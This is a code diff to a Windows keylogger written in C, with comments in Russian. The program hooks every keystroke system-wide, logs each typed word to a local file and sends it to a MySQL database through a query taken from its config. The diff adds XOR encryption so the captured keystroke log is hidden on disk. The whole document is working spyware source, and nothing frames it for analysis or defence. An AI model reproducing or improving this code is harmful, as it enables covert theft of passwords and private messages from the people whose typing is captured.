@@ -24,9 +24,16 @@ struct DbConfig {
     char password[128];
     char database[128];
     char insert_query[256];
+    char encryption_key[128];
 } g_db_config;
 
+// Отслеживает текущую позицию в файле для правильного применения XOR ключа
+long g_encryption_pos = 0;
+
 void send_word_to_db();
+
+// Объявление новой функции для шифрования
+void fputs_encrypted(const char* str, FILE* stream);
 
 // Callback вызываемый при нажатии на клавишу
 LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
@@ -53,26 +60,26 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             if (result > 0) {
                 unicode_char_buffer[result] = L'\0'; // Завершаем строку
 
-                // Проверяем, является ли символ пробелом, переносом строки и т.д.
+                // Проверяем, является ли символ пробелом, переносом строки и тд
                 if (iswspace(unicode_char_buffer[0])) {
                     if (state == IN) {
                         send_word_to_db();
-                        fprintf(g_log, "\n");
+                        fputs_encrypted("\n", g_log);
                     }
                     state = OUT;
-                } else { // Если это печатаемый символ (включая кириллицу)
+                } else {
                     if (state == OUT) {
                         state = IN;
-                        fprintf(g_log, "%s", timestamp_str);
+                        fputs_encrypted(timestamp_str, g_log);
                     }
 
                     // Конвертируем UTF-16 (wchar_t) в UTF-8 (char) для записи в файл и БД
                     char utf8_buffer[5] = {0};
                     int bytes_written = WideCharToMultiByte(CP_UTF8, 0, unicode_char_buffer, -1, utf8_buffer, sizeof(utf8_buffer), NULL, NULL);
 
-                    if (bytes_written > 1) { // >1, т.к. включает нуль-терминатор
-                        // Записываем UTF-8 символ(ы) в файл и буфер
-                        fprintf(g_log, "%s", utf8_buffer);
+                    if (bytes_written > 1) { // >1, потому что включает нуль-терминатор
+                        // Записываем UTF-8 символы в файл и буфер
+                        fputs_encrypted(utf8_buffer, g_log);
 
                         // Добавляем в буфер слова, если есть место
                         int len = bytes_written - 1;
@@ -103,10 +110,32 @@ void send_word_to_db() {
     sprintf(final_query, g_db_config.insert_query, g_word_buffer);
 
     if (mysql_query(g_conn, final_query)) {
-        fprintf(g_log, "MYSQL Error: %s\n", mysql_error(g_conn));
+        // Формируем строку ошибки и шифруем ее перед записью
+        char error_msg[512];
+        sprintf(error_msg, "MYSQL Error: %s\n", mysql_error(g_conn));
+        fputs_encrypted(error_msg, g_log);
         fflush(g_log);
     }
     g_word_buffer_index = 0; // Обнуляем буффер, чтобы принять новое слово в него
+}
+
+// Шифрование сохраняемого лога
+void fputs_encrypted(const char* str, FILE* stream) {
+    const char* key = g_db_config.encryption_key;
+    size_t key_len = strlen(key);
+    if (key_len == 0 || stream == NULL) {
+        // Если ключ пустой или файла нет, ничего не делаем или пишем как есть
+        if (stream) fputs(str, stream);
+        return;
+    }
+
+    size_t str_len = strlen(str);
+    for (size_t i = 0; i < str_len; i++) {
+        // Шифруем каждый символ со сдвигом
+        char encrypted_char = str[i] ^ key[g_encryption_pos % key_len];
+        fputc(encrypted_char, stream);
+        g_encryption_pos++;
+    }
 }
 
 // Функция для чтения config.ini
@@ -127,24 +156,34 @@ void load_config(const char* filename) {
             else if (strcmp(key, "password") == 0) strcpy(g_db_config.password, value);
             else if (strcmp(key, "database") == 0) strcpy(g_db_config.database, value);
             else if (strcmp(key, "insert_query") == 0) strcpy(g_db_config.insert_query, value);
+            else if (strcmp(key, "encryption_key") == 0) strcpy(g_db_config.encryption_key, value);
         }
     }
     fclose(file);
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    // Загружаем конфигурацию в самом начале
     load_config("config.ini");
 
-    g_log = fopen("C:\\Temp\\keylog.txt", "a");
-    if (!g_log) return 1;
-    fprintf(g_log, "--- Session Started ---\n");
+    // Открываем файл лога в бинарном режиме для дозаписи
+    g_log = fopen("C:\\Temp\\keylog.xor", "ab");
+    if (!g_log) {
+        MessageBox(NULL, "Не удалось создать или открыть лог-файл C:\\Temp\\keylog.xor.\nУбедитесь, что директория C:\\Temp существует.", "Критическая ошибка", MB_OK | MB_ICONERROR);
+        return 1;
+    }
+
+    // Определяем текущий размер файла, чтобы продолжить шифрование с правильной позиции
+    fseek(g_log, 0, SEEK_END);
+    g_encryption_pos = ftell(g_log);
+
+    // Записываем стартовое сообщение
+    fputs_encrypted("\n Session Started \n", g_log);
     fflush(g_log);
 
-    // --- Подключение к БД ---
+    // Подключение к БД
     g_conn = mysql_init(NULL);
     if (!g_conn) {
-        fprintf(g_log, "mysql_init() failed. Aborting.\n");
+        fputs_encrypted("mysql_init() failed. Aborting.\n", g_log);
         fclose(g_log);
         return 1;
     }
@@ -156,20 +195,24 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
                            g_db_config.database,
                            3306, NULL, 0) == NULL)
     {
-        fprintf(g_log, "mysql_real_connect() failed: %s\n", mysql_error(g_conn));
+        char error_msg[512];
+        sprintf(error_msg, "mysql_real_connect() failed: %s\n", mysql_error(g_conn));
+        fputs_encrypted(error_msg, g_log);
         mysql_close(g_conn);
         g_conn = NULL; // Указываем, что соединения нет
     } else {
-        fprintf(g_log, "Successfully connected to MySQL.\n");
+        fputs_encrypted("Successfully connected to MySQL.\n", g_log);
         mysql_set_character_set(g_conn, "utf8mb4");
-        fprintf(g_log, "Character set switched to utf8mb4.\n");
+        fputs_encrypted("Character set switched to utf8mb4.\n", g_log);
     }
     fflush(g_log);
 
     // Устанавливаем хук на ВСЮ систему
     g_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);
     if (!g_hHook) {
-        fprintf(g_log, "SetWindowsHookEx() failed. Error: %lu\n", GetLastError());
+        char error_msg[128];
+        sprintf(error_msg, "SetWindowsHookEx() failed. Error: %lu\n", GetLastError());
+        fputs_encrypted(error_msg, g_log);
         if (g_conn) mysql_close(g_conn);
         fclose(g_log);
         return 1;
@@ -185,7 +228,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     // Очистка
     UnhookWindowsHookEx(g_hHook);
     if (g_conn) {
-        fprintf(g_log, "Closing MySQL connection.\n");
+        fputs_encrypted("--- Closing MySQL connection. ---\n", g_log);
         mysql_close(g_conn);
     }
     fclose(g_log);
